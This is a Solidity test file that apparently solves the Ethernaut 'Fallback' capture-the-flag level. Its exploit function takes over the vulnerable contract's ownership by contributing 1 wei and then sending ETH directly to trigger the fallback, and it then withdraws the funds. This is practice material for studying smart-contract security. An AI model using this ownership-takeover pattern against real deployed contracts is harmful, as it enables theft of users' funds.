// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Fallback.sol";
import "src/levels/FallbackFactory.sol";

contract TestFallback is BaseTest {
    Fallback private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new FallbackFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance(true));
        level = Fallback(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */
        vm.startPrank(player);

        // Contribute some amount
        level.contribute{value: 1 wei}();

        // Directly transfer some ETH to take over the ownership
        (bool sent,) = address(level).call{value: 1 wei}("");
        require(sent, "Failed to send Ether");

        // Witdraw the funds
        level.withdraw();

        vm.stopPrank();
    }
}
